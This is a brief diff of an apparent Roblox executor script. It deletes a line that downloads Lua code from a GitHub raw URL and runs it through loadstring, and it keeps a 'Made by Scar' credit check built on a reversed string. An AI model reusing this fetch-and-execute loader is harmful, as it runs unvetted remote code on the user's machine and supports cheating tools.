@@ -1,5 +1,4 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/realgengar/scripts/refs/heads/main/Adm'),true))()
-wait(0.002)
+
 getgenv().d = "Made by Scar"
 local d = getgenv().d
 if not d:lower():find(("racs"):reverse()) then
